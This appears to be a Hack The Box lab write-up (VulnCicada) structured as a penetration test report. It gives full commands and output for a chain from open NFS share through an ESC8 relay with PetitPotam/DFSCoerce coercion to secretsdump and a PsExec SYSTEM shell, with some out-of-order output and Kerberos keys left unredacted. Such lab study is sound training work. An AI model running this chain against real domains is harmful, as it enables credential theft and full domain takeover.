+++
title = "VulnCicada-CPTS-Prep-Box-Writeup.md"
date = 2026-02-19T00:00:00Z
draft = false
description = "VulnCicada is a medium-difficulty Windows Active Directory machine featuring password discovery in image metadata, NFS share enumeration, and ESC8 (Web Enrollment over HTTP) exploitation to obtain a machine certificate and compromise the domain"
tags = ["CPTS", "HTB", "VulnCicada", "CPTS Prep", "Active Directory", "NFS", "ESC8", "AD CS", "Kerberos Relaying"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows domain "cicada.vl" (`10.129.234.48`). The objective was to evaluate the security posture of the target and identify potential escalation paths to full domain compromise.

The assessment successfully demonstrated a complete attack chain, moving from initial reconnaissance to domain administrator privileges. The following key findings were identified:

- **NFS Share Exposure:** An NFS share `/profiles` was accessible to everyone, containing user profile directories with sensitive files.

- **Password Discovery in Image Metadata:** Within the `Rosie.Powell` user directory, a `marketing.png` image contained embedded metadata with the password `<REDACTED>`, providing valid domain credentials.

- **AD CS Vulnerability (ESC8):** Certificate authority enumeration revealed that web enrollment was enabled over HTTP, making the domain vulnerable to ESC8 attacks.

- **Coercion Vulnerability:** The domain controller was vulnerable to multiple coercion techniques (PetitPotam, DFSCoerce, PrinterBug), allowing forced authentication to an attacker-controlled server.

- **Kerberos Relaying for Machine Certificate:** By combining coercion with an ESC8 relay attack, a certificate for the machine account (`DC-JPQ225$`) was obtained, enabling authentication as the domain controller itself.

- **Domain Compromise:** With the machine account's credentials, secretsdump was used to extract the `Administrator` hash, leading to full domain compromise.

**Impact:**  
This chain of exploits resulted in complete compromise of the Active Directory domain. An attacker starting with anonymous NFS access was able to escalate to domain administrator by leveraging exposed credentials, AD CS misconfigurations, and coercion vulnerabilities.

**Recommendations:**

- **Secure NFS Exports:** Restrict NFS shares to authenticated users only and avoid exposing sensitive directories.
- **Remove Metadata from Images:** Ensure images and files shared publicly do not contain embedded sensitive information.
- **Disable HTTP Web Enrollment:** AD CS web enrollment should only be available over HTTPS, or disabled entirely if not required.
- **Patch Coercion Vulnerabilities:** Apply Microsoft security updates to mitigate PetitPotam, DFSCoerce, and other coercion attacks.
- **Enable LDAP Signing and Channel Binding:** Prevent relay attacks by enforcing LDAP signing and channel binding requirements.

## About

VulnCicada is a Medium Windows Active Directory machine that involves discovering a password inside an image on a public share. With that password an attacker is able to discover that the machine is vulnerable to ESC8 and can use Kerberos relaying to bypass self-relay restrictions in order to get a certificate as the machine account itself. With this new certificate, we are able to dump the hashes of the `Administrator` user and thus compromise the whole domain.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. DNS Enumeration**  
The assessment began with DNS enumeration to identify the domain controller and any associated records.

```bash
❯ dig ANY dc-jpq225.cicada.vl @10.129.234.48

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> ANY dc-jpq225.cicada.vl @10.129.234.48
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 46112
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;dc-jpq225.cicada.vl.           IN      ANY

;; ANSWER SECTION:
dc-jpq225.cicada.vl.    3600    IN      A       10.129.234.48
dc-jpq225.cicada.vl.    3600    IN      AAAA    dead:beef::4523:521c:b12:1ac4

;; Query time: 783 msec
;; SERVER: 10.129.234.48#53(10.129.234.48) (TCP)
;; WHEN: Sat Nov 22 17:00:07 +07 2025
;; MSG SIZE  rcvd: 92

```
**Findings:** The domain controller resolved to `10.129.234.48` with both IPv4 and IPv6 addresses, confirming the domain name `cicada.vl`.


**2. Network Scanning**  
A comprehensive port scan was performed to identify all accessible services on the target.
```bash
nmap -sV -sC -p- dc-jpq225.cicada.vl
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
**Findings:** The scan revealed multiple open ports including DNS (53/tcp), HTTP (80/tcp) running IIS, RPC (135/tcp), SMB (445/tcp), RDP (3389/tcp), and notably an NFS service on port 111/tcp (rpcbind).

**3. NFS Share Enumeration**  
The NFS exports were enumerated to identify accessible shares.
```bash 
❯ showmount -e 10.129.234.48
Export list for 10.129.234.48:
/profiles (everyone)



❯ exiftool marketing.png
ExifTool Version Number         : 12.57
File Name                       : marketing.png
Directory                       : .
File Size                       : 1833 kB
File Modification Date/Time     : 2025:11:22 17:24:55+07:00
File Access Date/Time           : 2025:11:22 17:24:19+07:00
File Inode Change Date/Time     : 2025:11:22 17:24:55+07:00
File Permissions                : -rwx------
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1024
Image Height                    : 1024
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
XMP Toolkit                     : XMP Core 4.4.0-Exiv2
Digital Image GUID              : ae1cbc80-9ba3-4efa-a3ac-7183ebf9aa88
Digital Source Type             : http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Size                      : 1024x1024
Megapixels                      : 1.0

 ~honeypoop/HTB/CPTS-Prep/VulnCicada   


❯ ls -la
total 2
drwx------ 2 nobody nogroup  64 Sep 15  2024  .
drwxrwxrwx 2 nobody nogroup  64 Sep 15  2024  ..
drwx------ 2 nobody nogroup  64 Sep 13  2024 '$RECYCLE.BIN'
-rwx------ 1 nobody nogroup 402 Sep 13  2024  desktop.ini

❯ cat  desktop.ini

[.ShellClassInfo]
CLSID={645FF040-5081-101B-9F08-00AA002F954E}
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-8964

 /mnt/n/Ro/D/$RECYCLE.BIN           
 

cp -r /mnt/nfs_mount/Rosie.Powell/Documents/desktop.ini  /home/honeypoop/HTB/CPTS-Prep/VulnCicada/


```

**Findings:** An NFS share `/profiles` was exported with access for everyone.

### Phase 2: NFS Share Exploration

**4. Mounting the NFS Share**  
The NFS share was mounted locally for detailed exploration.
```bash
mkdir /mnt/nfs_mount
mount -t nfs 10.129.234.48:/profiles /mnt/nfs_mount
```

**5. User Directory Discovery**  
The mounted share contained multiple user profile directories.

```bash
❯ cd nfs_mount
❯ ls

❯ ls


Administrator    Jane.Carter     Katie.Ward       Rosie.Powell
Daniel.Marshall  Jordan.Francis  Megan.Simpson    Shirley.West
Debra.Wright     Joyce.Andrews   Richard.Gibbons
❯
❯ ls -la

total 10
drwxrwxrwx 2 nobody nogroup 4096 Jun  3 17:21 .
drwxr-xr-x 1 root   root      18 Nov 22 17:08 ..
drwxrwxrwx 2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx 2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx 2 nobody nogroup   64 Sep 13  2024 Shirley.West
```
**Findings:** Directories for several users were present, including `Administrator`, `Rosie.Powell`, `Jane.Carter`, and others, suggesting this might be a profile share for user home directories.

**6. Rosie.Powell Directory Exploration**  
The `Rosie.Powell` directory was examined for interesting files.
```bash
cd Rosie.Powell 
❯ ls -la
total 1797
drwxrwxrwx 2 nobody nogroup      64 Sep 15  2024 .
drwxrwxrwx 2 nobody nogroup    4096 Jun  3 17:21 ..
drwx------ 2 nobody nogroup      64 Sep 15  2024 Documents
-rwx------ 1 nobody nogroup 1832505 Sep 13  2024 marketing.png

cp -r /mnt/nfs_mount/Rosie.Powell/marketing.png /home/honeypoop/HTB/CPTS-Prep/VulnCicada/
```
**Findings:** A file named `marketing.png` was discovered and copied locally for analysis.
### Phase 3: Image Metadata Analysis

**8. ExifTool Analysis**  
The downloaded image was analyzed using exiftool to extract metadata.

```bash
exiftool marketing.png
```
**Findings:** While standard image metadata was present, the image itself contained visible text when opened.

**9. Password Discovery**  
Opening the `marketing.png` image revealed a marketing graphic with embedded text. Within the image, the password `<REDACTED>` was clearly visible.

**10. Credential Validation**  
The discovered credentials were validated against the domain controller.

```bash
❯ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p <REDACTED> -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:<REDACTED>

```
**Findings:** The credentials `Rosie.Powell:Cicada123` were valid and provided authenticated access to the domain.

### Phase 4: User Enumeration

**11. Domain User Enumeration**  
Using the valid credentials, domain users were enumerated.
```bash
❯ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p <REDACTED> -k --users
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:<REDACTED>
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator                 2024-09-13 15:16:47 0       Built-in account for administering the computer/domain
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        krbtgt                        2024-09-13 10:40:39 0       Key Distribution Center Service Account
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Shirley.West                  2024-09-13 15:32:42 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Jordan.Francis                2024-09-13 10:57:34 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Jane.Carter                   2024-09-13 10:57:34 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Joyce.Andrews                 2024-09-13 10:57:34 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Daniel.Marshall               2024-09-13 10:57:34 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Rosie.Powell                  2024-09-13 15:33:48 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Megan.Simpson                 2024-09-13 10:57:35 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Katie.Ward                    2024-09-13 10:57:35 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Richard.Gibbons               2024-09-13 10:57:35 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Debra.Wright                  2024-09-13 10:57:35 0
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated 13 local users: CICADA
```

**Findings:** Several domain users were identified:

- Shirley.West
    
- Jordan.Francis
    
- Jane.Carter
    
- Joyce.Andrews
    
- Daniel.Marshall
    
- Rosie.Powell
    
- Megan.Simpson
    
- Katie.Ward
    
- Richard.Gibbons
    
- Debra.Wright


### Phase 5: AD CS Enumeration

**12. Certificate Authority Discovery**  
Certipy was used to enumerate certificate templates and identify potential AD CS vulnerabilities.

```bash 
❯ certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p <REDACTED> -k -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DNS resolution failed: The DNS query name does not exist: DC-JPQ225.cicada.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 2623D8A5F579E7BB47245D6AAD74C23E
    Certificate Validity Start          : 2025-11-22 09:36:50+00:00
    Certificate Validity End            : 2525-11-22 09:46:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates

 /home/h/HTB/C/V/03-Attack-Chains   
```
**Findings:** The certificate authority was named `cicada-DC-JPQ225-CA`. Critically, web enrollment was enabled over HTTP, making the domain vulnerable to **ESC8**.

### Phase 6: Coercion Vulnerability Identification

**13. Coercion Method Testing**  
The domain controller was tested for coercion vulnerabilities that could force authentication to an attacker-controlled server.

```bash
❯ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p <REDACTED> -k -M coerce_plus
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:<REDACTED>
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce

COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven
❯
```
**Findings:** The domain controller was vulnerable to multiple coercion techniques:

- DFSCoerce
    
- PetitPotam
    
- PrinterBug
    
- MSEven

### Phase 7: DNS Record Creation for Relay

**14. DNS Record Setup**  
To facilitate the relay attack, a DNS record was created pointing to the attacker's IP address. This ensures the coerced authentication targets the attacker's machine.
```bash
bloodyAD -u Rosie.Powell -p <REDACTED> -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.16.25
```

### Phase 8: ESC8 Relay Attack

**15. Starting the Certipy Relay**  
Certipy was configured to relay coerced authentication to the vulnerable AD CS web enrollment endpoint.
```bash
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
```

**16. Triggering Coercion**  
Using one of the identified coercion methods (PetitPotam), the domain controller was forced to authenticate to the attacker's server.
```bash
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p <REDACTED> -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

Alternative method using dfscoerce.py:
```bash
python3 dfscoerce.py -k -u Rosie.Powell -p '<REDACTED>' -d cicada.vl 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' DC-JPQ225.cicada.vl
```

**17. Certificate Issuance**  
The relayed authentication was successfully processed by the AD CS web enrollment endpoint, resulting in the issuance of a certificate for the machine account.
```bash

❯ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)

/root/.local/pipx/venvs/certipy-ad/lib/python3.12/site-packages/impacket/examples/ntlmrelayx/attacks/__init__.py:20: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] SMBD-Thread-2 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 91
[*] Retrieving certificate for request ID: 91
[*] SMBD-Thread-4 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=91 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...
```
**Findings:** A certificate for the machine account `DC-JPQ225$` was obtained and saved as `dc-jpq225.pfx`.

### Phase 9: Machine Account Authentication

**18. Certificate Authentication**  
The obtained certificate was used to authenticate and retrieve the NT hash for the machine account.

```bash 
❯ certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:<REDACTED>

 ~honeypoop/HTB/CPTS-Prep/VulnCicada   
```
**Findings:** The NT hash for the machine account `dc-jpq225$` was obtained: `<REDACTED>`.


### Phase 10: Domain Administrator Hash Extraction

**19. Secretsdump with Kerberos Authentication**  
Using the machine account's credentials and Kerberos authentication, the `Administrator` hash was extracted from the NTDS.dit database.

```bash
❯ KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up...

 ~honeypoop/HTB/CPTS-Prep/VulnCicada   
```
**Findings:** The NT hash for the `Administrator` account was obtained: `<REDACTED>`.
### Phase 11: Domain Administrator Access

**20. Administrator Hash Validation**  
The extracted Administrator hash was validated against the domain controller.
```bash
 nxc smb 10.129.234.48 -u Administrator -H <REDACTED> -k
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [+] cicada.vl\Administrator:<REDACTED>

```
**Findings:** The hash was valid, confirming successful domain compromise.


**21. SYSTEM Shell with PsExec**  
PsExec was used to obtain a SYSTEM shell on the domain controller.

**22. User and Root Flags**  
Both flags were retrieved from the Administrator's desktop.

```bash
❯ psexec.py cicada.vl/administrator@dc-jpq225.cicada.vl -k -hashes :<REDACTED>

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Requesting shares on dc-jpq225.cicada.vl.....
[*] Found writable share ADMIN$
[*] Uploading file ZPmulDcu.exe
[*] Opening SVCManager on dc-jpq225.cicada.vl.....
[*] Creating service hETn on dc-jpq225.cicada.vl.....
[*] Starting service hETn.....
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Press help for extra shell commands
[-] CCache file is not found. Skipping...
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>

c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is D614-4931

 Directory of c:\Users\Administrator\Desktop

04/10/2025  10:00 PM    <DIR>          .
09/13/2024  08:10 AM    <DIR>          ..
09/15/2024  05:26 AM             2,304 Microsoft Edge.lnk
11/22/2025  01:41 AM                34 root.txt
11/22/2025  01:41 AM                34 user.txt
               3 File(s)          2,372 bytes
               2 Dir(s)   3,450,429,440 bytes free

c:\Users\Administrator\Desktop> type  user.txt
<REDACTED>

c:\Users\Administrator\Desktop> type  root.txt
<REDACTED>

c:\Users\Administrator\Desktop>

```


## Key Takeaways

- **NFS Security:** Publicly accessible NFS shares can expose sensitive data, including credentials hidden in files.
    
- **Metadata Risks:** Images and documents may contain embedded sensitive information that can be easily extracted.
    
- **AD CS ESC8:** Web enrollment over HTTP allows relay attacks that can compromise machine accounts and the entire domain.
    
- **Coercion Vulnerabilities:** PetitPotam, DFSCoerce, and similar attacks remain effective on unpatched systems.
    
- **Kerberos Relaying:** Combining coercion with relay attacks can bypass self-relay restrictions to obtain machine certificates.
    
- **Machine Account Abuse:** With a machine account certificate, an attacker can authenticate as the domain controller and extract all domain hashes.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
